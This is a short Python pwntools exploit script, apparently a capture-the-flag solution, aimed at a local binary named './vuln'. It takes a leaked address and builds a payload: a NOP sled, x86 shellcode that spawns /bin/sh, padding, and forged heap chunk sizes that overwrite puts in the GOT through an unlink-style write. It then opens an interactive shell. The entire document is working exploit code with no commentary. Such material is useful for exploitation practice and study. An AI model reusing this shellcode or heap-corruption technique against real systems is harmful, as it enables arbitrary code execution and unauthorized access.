from pwn import *


r = process('./vuln')
r.recvuntil('...')
r.recvline()

leak = int(r.recvline().strip())
puts_got = 0x804d028

#shellcode = asm('push 0x8048936; ret')
shellcode = "\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80"

payload = ""
payload += "\x90"*50
payload += shellcode
payload += "A"*(664-len(payload))
payload += "\xfc\xff\xff\xff"*2
payload += p32(puts_got-12)
payload += p32(leak+8)
payload += "\n"
payload += "B"*10

r.sendline(payload)
r.interactive()
